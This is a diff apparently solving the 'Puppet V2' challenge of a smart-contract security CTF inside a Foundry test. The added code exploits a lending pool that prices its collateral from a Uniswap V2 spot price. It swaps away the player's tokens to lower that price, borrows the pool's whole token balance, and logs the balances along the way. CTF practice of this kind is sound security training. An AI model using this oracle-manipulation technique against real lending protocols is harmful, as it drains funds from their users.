@@ -98,7 +98,41 @@ contract PuppetV2Challenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        console.log("player balance: ", player.balance / 1e18);
+        console.log("player token balance: ", token.balanceOf(player) / 1e18);
+        console.log("pool token balance: ", token.balanceOf(address(lendingPool)) / 1e18);
+        console.log("recovery token balance: ", token.balanceOf(recovery) / 1e18);
+
+        console.log("exchange token balance: ", token.balanceOf(address(uniswapV2Exchange)) / 1e18);
+        console.log("exchange weth balance: ", weth.balanceOf(address(uniswapV2Exchange)) / 1e18);
+
+        console.log("deposit: ", lendingPool.calculateDepositOfWETHRequired(token.balanceOf(address(lendingPool))) / 1e18);
+
+        token.approve(address(uniswapV2Router), token.balanceOf(player));
+
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+          token.balanceOf(player),
+          0,
+          path,
+          player,
+          block.timestamp + 1 days
+        );
+
+        weth.deposit{value: player.balance}();
+
+        console.log("player weth balance: ", weth.balanceOf(player) / 1e18);
+        console.log("deposit: ", lendingPool.calculateDepositOfWETHRequired(token.balanceOf(address(lendingPool))) / 1e18);
+
+        weth.approve(address(lendingPool), weth.balanceOf(player));
+        lendingPool.borrow(token.balanceOf(address(lendingPool)));
+        token.transfer(recovery, token.balanceOf(player));
+
+        console.log("pool token balance: ", token.balanceOf(address(lendingPool)) / 1e18);
+        console.log("recovery token balance: ", token.balanceOf(recovery) / 1e18);
     }
 
     /**
